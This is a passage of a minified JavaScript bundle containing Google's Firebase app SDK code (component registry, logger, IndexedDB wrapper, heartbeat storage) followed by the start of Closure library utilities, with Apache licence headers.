        if (this.component) throw Error(`Component for ${this.name} has already been provided`);
        if (this.component = t, !!this.shouldAutoInitialize()) {
            if (J6(t)) try {
                this.getOrInitializeService({
                    instanceIdentifier: ts
                })
            } catch {}
            for (const [s, n] of this.instancesDeferred.entries()) {
                const i = this.normalizeInstanceIdentifier(s);
                try {
                    const r = this.getOrInitializeService({
                        instanceIdentifier: i
                    });
                    n.resolve(r)
                } catch {}
            }
        }
    }
    clearInstance(t = ts) {
        this.instancesDeferred.delete(t), this.instancesOptions.delete(t), this.instances.delete(t)
    }
    async delete() {
        const t = Array.from(this.instances.values());
        await Promise.all([...t.filter(s => "INTERNAL" in s).map(s => s.INTERNAL.delete()), ...t.filter(s => "_delete" in s).map(s => s._delete())])
    }
    isComponentSet() {
        return this.component != null
    }
    isInitialized(t = ts) {
        return this.instances.has(t)
    }
    getOptions(t = ts) {
        return this.instancesOptions.get(t) || {}
    }
    initialize(t = {}) {
        const {
            options: s = {}
        } = t, n = this.normalizeInstanceIdentifier(t.instanceIdentifier);
        if (this.isInitialized(n)) throw Error(`${this.name}(${n}) has already been initialized`);
        if (!this.isComponentSet()) throw Error(`Component ${this.name} has not been registered yet`);
        const i = this.getOrInitializeService({
            instanceIdentifier: n,
            options: s
        });
        for (const [r, o] of this.instancesDeferred.entries()) {
            const l = this.normalizeInstanceIdentifier(r);
            n === l && o.resolve(i)
        }
        return i
    }
    onInit(t, s) {
        var n;
        const i = this.normalizeInstanceIdentifier(s),
            r = (n = this.onInitCallbacks.get(i)) !== null && n !== void 0 ? n : new Set;
        r.add(t), this.onInitCallbacks.set(i, r);
        const o = this.instances.get(i);
        return o && t(o, i), () => {
            r.delete(t)
        }
    }
    invokeOnInitCallbacks(t, s) {
        const n = this.onInitCallbacks.get(s);
        if (n)
            for (const i of n) try {
                i(t, s)
            } catch {}
    }
    getOrInitializeService({
        instanceIdentifier: t,
        options: s = {}
    }) {
        let n = this.instances.get(t);
        if (!n && this.component && (n = this.component.instanceFactory(this.container, {
                instanceIdentifier: Q6(t),
                options: s
            }), this.instances.set(t, n), this.instancesOptions.set(t, s), this.invokeOnInitCallbacks(n, t), this.component.onInstanceCreated)) try {
            this.component.onInstanceCreated(this.container, t, n)
        } catch {}
        return n || null
    }
    normalizeInstanceIdentifier(t = ts) {
        return this.component ? this.component.multipleInstances ? t : ts : t
    }
    shouldAutoInitialize() {
        return !!this.component && this.component.instantiationMode !== "EXPLICIT"
    }
}

function Q6(e) {
    return e === ts ? void 0 : e
}

function J6(e) {
    return e.instantiationMode === "EAGER"
}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class e9 {
    constructor(t) {
        this.name = t, this.providers = new Map
    }
    addComponent(t) {
        const s = this.getProvider(t.name);
        if (s.isComponentSet()) throw new Error(`Component ${t.name} has already been registered with ${this.name}`);
        s.setComponent(t)
    }
    addOrOverwriteComponent(t) {
        this.getProvider(t.name).isComponentSet() && this.providers.delete(t.name), this.addComponent(t)
    }
    getProvider(t) {
        if (this.providers.has(t)) return this.providers.get(t);
        const s = new Y6(t, this);
        return this.providers.set(t, s), s
    }
    getProviders() {
        return Array.from(this.providers.values())
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
var ve;
(function(e) {
    e[e.DEBUG = 0] = "DEBUG", e[e.VERBOSE = 1] = "VERBOSE", e[e.INFO = 2] = "INFO", e[e.WARN = 3] = "WARN", e[e.ERROR = 4] = "ERROR", e[e.SILENT = 5] = "SILENT"
})(ve || (ve = {}));
const t9 = {
        debug: ve.DEBUG,
        verbose: ve.VERBOSE,
        info: ve.INFO,
        warn: ve.WARN,
        error: ve.ERROR,
        silent: ve.SILENT
    },
    s9 = ve.INFO,
    n9 = {
        [ve.DEBUG]: "log",
        [ve.VERBOSE]: "log",
        [ve.INFO]: "info",
        [ve.WARN]: "warn",
        [ve.ERROR]: "error"
    },
    i9 = (e, t, ...s) => {
        if (t < e.logLevel) return;
        const n = new Date().toISOString(),
            i = n9[t];
        if (i) console[i](`[${n}]  ${e.name}:`, ...s);
        else throw new Error(`Attempted to log a message with an invalid logType (value: ${t})`)
    };
class kd {
    constructor(t) {
        this.name = t, this._logLevel = s9, this._logHandler = i9, this._userLogHandler = null
    }
    get logLevel() {
        return this._logLevel
    }
    set logLevel(t) {
        if (!(t in ve)) throw new TypeError(`Invalid value "${t}" assigned to \`logLevel\``);
        this._logLevel = t
    }
    setLogLevel(t) {
        this._logLevel = typeof t == "string" ? t9[t] : t
    }
    get logHandler() {
        return this._logHandler
    }
    set logHandler(t) {
        if (typeof t != "function") throw new TypeError("Value assigned to `logHandler` must be a function");
        this._logHandler = t
    }
    get userLogHandler() {
        return this._userLogHandler
    }
    set userLogHandler(t) {
        this._userLogHandler = t
    }
    debug(...t) {
        this._userLogHandler && this._userLogHandler(this, ve.DEBUG, ...t), this._logHandler(this, ve.DEBUG, ...t)
    }
    log(...t) {
        this._userLogHandler && this._userLogHandler(this, ve.VERBOSE, ...t), this._logHandler(this, ve.VERBOSE, ...t)
    }
    info(...t) {
        this._userLogHandler && this._userLogHandler(this, ve.INFO, ...t), this._logHandler(this, ve.INFO, ...t)
    }
    warn(...t) {
        this._userLogHandler && this._userLogHandler(this, ve.WARN, ...t), this._logHandler(this, ve.WARN, ...t)
    }
    error(...t) {
        this._userLogHandler && this._userLogHandler(this, ve.ERROR, ...t), this._logHandler(this, ve.ERROR, ...t)
    }
}
const r9 = (e, t) => t.some(s => e instanceof s);
let Al, Ll;

function o9() {
    return Al || (Al = [IDBDatabase, IDBObjectStore, IDBIndex, IDBCursor, IDBTransaction])
}

function a9() {
    return Ll || (Ll = [IDBCursor.prototype.advance, IDBCursor.prototype.continue, IDBCursor.prototype.continuePrimaryKey])
}
const Od = new WeakMap,
    Xr = new WeakMap,
    $d = new WeakMap,
    br = new WeakMap,
    Uo = new WeakMap;

function l9(e) {
    const t = new Promise((s, n) => {
        const i = () => {
                e.removeEventListener("success", r), e.removeEventListener("error", o)
            },
            r = () => {
                s(qt(e.result)), i()
            },
            o = () => {
                n(e.error), i()
            };
        e.addEventListener("success", r), e.addEventListener("error", o)
    });
    return t.then(s => {
        s instanceof IDBCursor && Od.set(s, e)
    }).catch(() => {}), Uo.set(t, e), t
}

function c9(e) {
    if (Xr.has(e)) return;
    const t = new Promise((s, n) => {
        const i = () => {
                e.removeEventListener("complete", r), e.removeEventListener("error", o), e.removeEventListener("abort", o)
            },
            r = () => {
                s(), i()
            },
            o = () => {
                n(e.error || new DOMException("AbortError", "AbortError")), i()
            };
        e.addEventListener("complete", r), e.addEventListener("error", o), e.addEventListener("abort", o)
    });
    Xr.set(e, t)
}
let Yr = {
    get(e, t, s) {
        if (e instanceof IDBTransaction) {
            if (t === "done") return Xr.get(e);
            if (t === "objectStoreNames") return e.objectStoreNames || $d.get(e);
            if (t === "store") return s.objectStoreNames[1] ? void 0 : s.objectStore(s.objectStoreNames[0])
        }
        return qt(e[t])
    },
    set(e, t, s) {
        return e[t] = s, !0
    },
    has(e, t) {
        return e instanceof IDBTransaction && (t === "done" || t === "store") ? !0 : t in e
    }
};

function d9(e) {
    Yr = e(Yr)
}

function f9(e) {
    return e === IDBDatabase.prototype.transaction && !("objectStoreNames" in IDBTransaction.prototype) ? function(t, ...s) {
        const n = e.call(wr(this), t, ...s);
        return $d.set(n, t.sort ? t.sort() : [t]), qt(n)
    } : a9().includes(e) ? function(...t) {
        return e.apply(wr(this), t), qt(Od.get(this))
    } : function(...t) {
        return qt(e.apply(wr(this), t))
    }
}

function p9(e) {
    return typeof e == "function" ? f9(e) : (e instanceof IDBTransaction && c9(e), r9(e, o9()) ? new Proxy(e, Yr) : e)
}

function qt(e) {
    if (e instanceof IDBRequest) return l9(e);
    if (br.has(e)) return br.get(e);
    const t = p9(e);
    return t !== e && (br.set(e, t), Uo.set(t, e)), t
}
const wr = e => Uo.get(e);

function u9(e, t, {
    blocked: s,
    upgrade: n,
    blocking: i,
    terminated: r
} = {}) {
    const o = indexedDB.open(e, t),
        l = qt(o);
    return n && o.addEventListener("upgradeneeded", a => {
        n(qt(o.result), a.oldVersion, a.newVersion, qt(o.transaction), a)
    }), s && o.addEventListener("blocked", a => s(a.oldVersion, a.newVersion, a)), l.then(a => {
        r && a.addEventListener("close", () => r()), i && a.addEventListener("versionchange", c => i(c.oldVersion, c.newVersion, c))
    }).catch(() => {}), l
}
const h9 = ["get", "getKey", "getAll", "getAllKeys", "count"],
    g9 = ["put", "add", "delete", "clear"],
    xr = new Map;

function Il(e, t) {
    if (!(e instanceof IDBDatabase && !(t in e) && typeof t == "string")) return;
    if (xr.get(t)) return xr.get(t);
    const s = t.replace(/FromIndex$/, ""),
        n = t !== s,
        i = g9.includes(s);
    if (!(s in (n ? IDBIndex : IDBObjectStore).prototype) || !(i || h9.includes(s))) return;
    const r = async function(o, ...l) {
        const a = this.transaction(o, i ? "readwrite" : "readonly");
        let c = a.store;
        return n && (c = c.index(l.shift())), (await Promise.all([c[s](...l), i && a.done]))[0]
    };
    return xr.set(t, r), r
}
d9(e => ({ ...e,
    get: (t, s, n) => Il(t, s) || e.get(t, s, n),
    has: (t, s) => !!Il(t, s) || e.has(t, s)
}));
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class m9 {
    constructor(t) {
        this.container = t
    }
    getPlatformInfoString() {
        return this.container.getProviders().map(s => {
            if (v9(s)) {
                const n = s.getImmediate();
                return `${n.library}/${n.version}`
            } else return null
        }).filter(s => s).join(" ")
    }
}

function v9(e) {
    const t = e.getComponent();
    return (t == null ? void 0 : t.type) === "VERSION"
}
const Qr = "@firebase/app",
    Nl = "0.9.27";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const ps = new kd("@firebase/app"),
    y9 = "@firebase/app-compat",
    b9 = "@firebase/analytics-compat",
    w9 = "@firebase/analytics",
    x9 = "@firebase/app-check-compat",
    _9 = "@firebase/app-check",
    C9 = "@firebase/auth",
    S9 = "@firebase/auth-compat",
    E9 = "@firebase/database",
    T9 = "@firebase/database-compat",
    A9 = "@firebase/functions",
    L9 = "@firebase/functions-compat",
    I9 = "@firebase/installations",
    N9 = "@firebase/installations-compat",
    P9 = "@firebase/messaging",
    M9 = "@firebase/messaging-compat",
    k9 = "@firebase/performance",
    O9 = "@firebase/performance-compat",
    $9 = "@firebase/remote-config",
    R9 = "@firebase/remote-config-compat",
    D9 = "@firebase/storage",
    H9 = "@firebase/storage-compat",
    V9 = "@firebase/firestore",
    j9 = "@firebase/firestore-compat",
    B9 = "firebase",
    F9 = "10.8.0";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const Jr = "[DEFAULT]",
    z9 = {
        [Qr]: "fire-core",
        [y9]: "fire-core-compat",
        [w9]: "fire-analytics",
        [b9]: "fire-analytics-compat",
        [_9]: "fire-app-check",
        [x9]: "fire-app-check-compat",
        [C9]: "fire-auth",
        [S9]: "fire-auth-compat",
        [E9]: "fire-rtdb",
        [T9]: "fire-rtdb-compat",
        [A9]: "fire-fn",
        [L9]: "fire-fn-compat",
        [I9]: "fire-iid",
        [N9]: "fire-iid-compat",
        [P9]: "fire-fcm",
        [M9]: "fire-fcm-compat",
        [k9]: "fire-perf",
        [O9]: "fire-perf-compat",
        [$9]: "fire-rc",
        [R9]: "fire-rc-compat",
        [D9]: "fire-gcs",
        [H9]: "fire-gcs-compat",
        [V9]: "fire-fst",
        [j9]: "fire-fst-compat",
        "fire-js": "fire-js",
        [B9]: "fire-js-all"
    };
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const hi = new Map,
    eo = new Map;

function U9(e, t) {
    try {
        e.container.addComponent(t)
    } catch (s) {
        ps.debug(`Component ${t.name} failed to register with FirebaseApp ${e.name}`, s)
    }
}

function gi(e) {
    const t = e.name;
    if (eo.has(t)) return ps.debug(`There were multiple attempts to register component ${t}.`), !1;
    eo.set(t, e);
    for (const s of hi.values()) U9(s, e);
    return !0
}

function G9(e, t) {
    const s = e.container.getProvider("heartbeat").getImmediate({
        optional: !0
    });
    return s && s.triggerHeartbeat(), e.container.getProvider(t)
}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const W9 = {
        "no-app": "No Firebase App '{$appName}' has been created - call initializeApp() first",
        "bad-app-name": "Illegal App name: '{$appName}",
        "duplicate-app": "Firebase App named '{$appName}' already exists with different options or config",
        "app-deleted": "Firebase App named '{$appName}' already deleted",
        "no-options": "Need to provide options, when not being deployed to hosting via source.",
        "invalid-app-argument": "firebase.{$appName}() takes either no argument or a Firebase App instance.",
        "invalid-log-argument": "First argument to `onLog` must be null or a function.",
        "idb-open": "Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.",
        "idb-get": "Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.",
        "idb-set": "Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.",
        "idb-delete": "Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}."
    },
    Kt = new Md("app", "Firebase", W9);
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class q9 {
    constructor(t, s, n) {
        this._isDeleted = !1, this._options = Object.assign({}, t), this._config = Object.assign({}, s), this._name = s.name, this._automaticDataCollectionEnabled = s.automaticDataCollectionEnabled, this._container = n, this.container.addComponent(new hn("app", () => this, "PUBLIC"))
    }
    get automaticDataCollectionEnabled() {
        return this.checkDestroyed(), this._automaticDataCollectionEnabled
    }
    set automaticDataCollectionEnabled(t) {
        this.checkDestroyed(), this._automaticDataCollectionEnabled = t
    }
    get name() {
        return this.checkDestroyed(), this._name
    }
    get options() {
        return this.checkDestroyed(), this._options
    }
    get config() {
        return this.checkDestroyed(), this._config
    }
    get container() {
        return this._container
    }
    get isDeleted() {
        return this._isDeleted
    }
    set isDeleted(t) {
        this._isDeleted = t
    }
    checkDestroyed() {
        if (this.isDeleted) throw Kt.create("app-deleted", {
            appName: this._name
        })
    }
}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const K9 = F9;

function Go(e, t = {}) {
    let s = e;
    typeof t != "object" && (t = {
        name: t
    });
    const n = Object.assign({
            name: Jr,
            automaticDataCollectionEnabled: !1
        }, t),
        i = n.name;
    if (typeof i != "string" || !i) throw Kt.create("bad-app-name", {
        appName: String(i)
    });
    if (s || (s = Pd()), !s) throw Kt.create("no-options");
    const r = hi.get(i);
    if (r) {
        if (Zr(s, r.options) && Zr(n, r.config)) return r;
        throw Kt.create("duplicate-app", {
            appName: i
        })
    }
    const o = new e9(i);
    for (const a of eo.values()) o.addComponent(a);
    const l = new q9(s, n, o);
    return hi.set(i, l), l
}

function Z9(e = Jr) {
    const t = hi.get(e);
    if (!t && e === Jr && Pd()) return Go();
    if (!t) throw Kt.create("no-app", {
        appName: e
    });
    return t
}

function Ls(e, t, s) {
    var n;
    let i = (n = z9[e]) !== null && n !== void 0 ? n : e;
    s && (i += `-${s}`);
    const r = i.match(/\s|\//),
        o = t.match(/\s|\//);
    if (r || o) {
        const l = [`Unable to register library "${i}" with version "${t}":`];
        r && l.push(`library name "${i}" contains illegal characters (whitespace or "/")`), r && o && l.push("and"), o && l.push(`version name "${t}" contains illegal characters (whitespace or "/")`), ps.warn(l.join(" "));
        return
    }
    gi(new hn(`${i}-version`, () => ({
        library: i,
        version: t
    }), "VERSION"))
}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const X9 = "firebase-heartbeat-database",
    Y9 = 1,
    gn = "firebase-heartbeat-store";
let _r = null;

function Rd() {
    return _r || (_r = u9(X9, Y9, {
        upgrade: (e, t) => {
            switch (t) {
                case 0:
                    try {
                        e.createObjectStore(gn)
                    } catch (s) {
                        console.warn(s)
                    }
            }
        }
    }).catch(e => {
        throw Kt.create("idb-open", {
            originalErrorMessage: e.message
        })
    })), _r
}
async function Q9(e) {
    try {
        const s = (await Rd()).transaction(gn),
            n = await s.objectStore(gn).get(Dd(e));
        return await s.done, n
    } catch (t) {
        if (t instanceof Bs) ps.warn(t.message);
        else {
            const s = Kt.create("idb-get", {
                originalErrorMessage: t == null ? void 0 : t.message
            });
            ps.warn(s.message)
        }
    }
}
async function Pl(e, t) {
    try {
        const n = (await Rd()).transaction(gn, "readwrite");
        await n.objectStore(gn).put(t, Dd(e)), await n.done
    } catch (s) {
        if (s instanceof Bs) ps.warn(s.message);
        else {
            const n = Kt.create("idb-set", {
                originalErrorMessage: s == null ? void 0 : s.message
            });
            ps.warn(n.message)
        }
    }
}

function Dd(e) {
    return `${e.name}!${e.options.appId}`
}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const J9 = 1024,
    e4 = 30 * 24 * 60 * 60 * 1e3;
class t4 {
    constructor(t) {
        this.container = t, this._heartbeatsCache = null;
        const s = this.container.getProvider("app").getImmediate();
        this._storage = new n4(s), this._heartbeatsCachePromise = this._storage.read().then(n => (this._heartbeatsCache = n, n))
    }
    async triggerHeartbeat() {
        var t, s;
        const i = this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),
            r = Ml();
        if (!(((t = this._heartbeatsCache) === null || t === void 0 ? void 0 : t.heartbeats) == null && (this._heartbeatsCache = await this._heartbeatsCachePromise, ((s = this._heartbeatsCache) === null || s === void 0 ? void 0 : s.heartbeats) == null)) && !(this._heartbeatsCache.lastSentHeartbeatDate === r || this._heartbeatsCache.heartbeats.some(o => o.date === r))) return this._heartbeatsCache.heartbeats.push({
            date: r,
            agent: i
        }), this._heartbeatsCache.heartbeats = this._heartbeatsCache.heartbeats.filter(o => {
            const l = new Date(o.date).valueOf();
            return Date.now() - l <= e4
        }), this._storage.overwrite(this._heartbeatsCache)
    }
    async getHeartbeatsHeader() {
        var t;
        if (this._heartbeatsCache === null && await this._heartbeatsCachePromise, ((t = this._heartbeatsCache) === null || t === void 0 ? void 0 : t.heartbeats) == null || this._heartbeatsCache.heartbeats.length === 0) return "";
        const s = Ml(),
            {
                heartbeatsToSend: n,
                unsentEntries: i
            } = s4(this._heartbeatsCache.heartbeats),
            r = ui(JSON.stringify({
                version: 2,
                heartbeats: n
            }));
        return this._heartbeatsCache.lastSentHeartbeatDate = s, i.length > 0 ? (this._heartbeatsCache.heartbeats = i, await this._storage.overwrite(this._heartbeatsCache)) : (this._heartbeatsCache.heartbeats = [], this._storage.overwrite(this._heartbeatsCache)), r
    }
}

function Ml() {
    return new Date().toISOString().substring(0, 10)
}

function s4(e, t = J9) {
    const s = [];
    let n = e.slice();
    for (const i of e) {
        const r = s.find(o => o.agent === i.agent);
        if (r) {
            if (r.dates.push(i.date), kl(s) > t) {
                r.dates.pop();
                break
            }
        } else if (s.push({
                agent: i.agent,
                dates: [i.date]
            }), kl(s) > t) {
            s.pop();
            break
        }
        n = n.slice(1)
    }
    return {
        heartbeatsToSend: s,
        unsentEntries: n
    }
}
class n4 {
    constructor(t) {
        this.app = t, this._canUseIndexedDBPromise = this.runIndexedDBEnvironmentCheck()
    }
    async runIndexedDBEnvironmentCheck() {
        return G6() ? W6().then(() => !0).catch(() => !1) : !1
    }
    async read() {
        if (await this._canUseIndexedDBPromise) {
            const s = await Q9(this.app);
            return s != null && s.heartbeats ? s : {
                heartbeats: []
            }
        } else return {
            heartbeats: []
        }
    }
    async overwrite(t) {
        var s;
        if (await this._canUseIndexedDBPromise) {
            const i = await this.read();
            return Pl(this.app, {
                lastSentHeartbeatDate: (s = t.lastSentHeartbeatDate) !== null && s !== void 0 ? s : i.lastSentHeartbeatDate,
                heartbeats: t.heartbeats
            })
        } else return
    }
    async add(t) {
        var s;
        if (await this._canUseIndexedDBPromise) {
            const i = await this.read();
            return Pl(this.app, {
                lastSentHeartbeatDate: (s = t.lastSentHeartbeatDate) !== null && s !== void 0 ? s : i.lastSentHeartbeatDate,
                heartbeats: [...i.heartbeats, ...t.heartbeats]
            })
        } else return
    }
}

function kl(e) {
    return ui(JSON.stringify({
        version: 2,
        heartbeats: e
    })).length
}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function i4(e) {
    gi(new hn("platform-logger", t => new m9(t), "PRIVATE")), gi(new hn("heartbeat", t => new t4(t), "PRIVATE")), Ls(Qr, Nl, e), Ls(Qr, Nl, "esm2017"), Ls("fire-js", "")
}
i4("");
var r4 = "firebase",
    o4 = "10.8.0";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
Ls(r4, o4, "app");
var a4 = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {},
    H, Wo = Wo || {},
    Y = a4 || self;

function ji(e) {
    var t = typeof e;
    return t = t != "object" ? t : e ? Array.isArray(e) ? "array" : t : "null", t == "array" || t == "object" && typeof e.length == "number"
}

function An(e) {
    var t = typeof e;
    return t == "object" && e != null || t == "function"
}

function l4(e) {
    return Object.prototype.hasOwnProperty.call(e, Cr) && e[Cr] || (e[Cr] = ++c4)
}
var Cr = "closure_uid_" + (1e9 * Math.random() >>> 0),
    c4 = 0;

function d4(e, t, s) {
    return e.call.apply(e.bind, arguments)
}

function f4(e, t, s) {
    if (!e) throw Error();
    if (2 < arguments.length) {
        var n = Array.prototype.slice.call(arguments, 2);
        return function() {
            var i = Array.prototype.slice.call(arguments);
            return Array.prototype.unshift.apply(i, n), e.apply(t, i)
        }
    }
    return function() {
        return e.apply(t, arguments)
    }
}

function ze(e, t, s) {
    return Function.prototype.bind && Function.prototype.bind.toString().indexOf("native code") != -1 ? ze = d4 : ze = f4, ze.apply(null, arguments)
}

function Gn(e, t) {
    var s = Array.prototype.slice.call(arguments, 1);
    return function() {
        var n = s.slice();
        return n.push.apply(n, arguments), e.apply(this, n)
    }
}

function Oe(e, t) {
    function s() {}
    s.prototype = t.prototype, e.$ = t.prototype, e.prototype = new s, e.prototype.constructor = e, e.ac = function(n, i, r) {
        for (var o = Array(arguments.length - 2), l = 2; l < arguments.length; l++) o[l - 2] = arguments[l];
        return t.prototype[i].apply(n, o)
    }
}

function Yt() {
    this.s = this.s, this.o = this.o
}
var p4 = 0;
Yt.prototype.s = !1;
Yt.prototype.sa = function() {
    !this.s && (this.s = !0, this.N(), p4 != 0) && l4(this)
};
Yt.prototype.N = function() {
    if (this.o)
        for (; this.o.length;) this.o.shift()()
};
const Hd = Array.prototype.indexOf ? function(e, t) {
    return Array.prototype.indexOf.call(e, t, void 0)
} : function(e, t) {
    if (typeof e == "string") return typeof t != "string" || t.length != 1 ? -1 : e.indexOf(t, 0);
    for (let s = 0; s < e.length; s++)
        if (s in e && e[s] === t) return s;
    return -1
};

function qo(e) {
    const t = e.length;
    if (0 < t) {
        const s = Array(t);
        for (let n = 0; n < t; n++) s[n] = e[n];
        return s
    }
    return []
}

function Ol(e, t) {
    for (let s = 1; s < arguments.length; s++) {
        const n = arguments[s];
        if (ji(n)) {
            const i = e.length || 0,
                r = n.length || 0;
            e.length = i + r;
            for (let o = 0; o < r; o++) e[i + o] = n[o]
        } else e.push(n)
    }
}

function Ue(e, t) {
    this.type = e, this.g = this.target = t, this.defaultPrevented = !1
}
Ue.prototype.h = function() {
    this.defaultPrevented = !0
};
var u4 = function() {
    if (!Y.addEventListener || !Object.defineProperty) return !1;
    var e = !1,
        t = Object.defineProperty({}, "passive", {
            get: function() {
                e = !0
            }
        });
    try {
        const s = () => {};
        Y.addEventListener("test", s, t), Y.removeEventListener("test", s, t)
    } catch {}
    return e
}();

function mn(e) {
    return /^[\s\xa0]*$/.test(e)
}

function Bi() {
    var e = Y.navigator;
    return e && (e = e.userAgent) ? e : ""
}

function _t(e) {
    return Bi().indexOf(e) != -1
}

function Ko(e) {
    return Ko[" "](e), e
}
Ko[" "] = function() {};

function h4(e, t) {
    var s = a5;
    return Object.prototype.hasOwnProperty.call(s, e) ? s[e] : s[e] = t(e)
}
var g4 = _t("Opera"),
    vn = _t("Trident") || _t("MSIE"),
    Vd = _t("Edge"),
    to = Vd || vn,
    jd = _t("Gecko") && !(Bi().toLowerCase().indexOf("webkit") != -1 && !_t("Edge")) && !(_t("Trident") || _t("MSIE")) && !_t("Edge"),
    m4 = Bi().toLowerCase().indexOf("webkit") != -1 && !_t("Edge");

function Bd() {
    var e = Y.document;
    return e ? e.documentMode : void 0
}
e: {
    var $l = "",
        Sr = function() {
            var e = Bi();
            if (jd) return /rv:([^\);]+)(\)|;)/.exec(e);
            if (Vd) return /Edge\/([\d\.]+)/.exec(e);
            if (vn) return /\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(e);
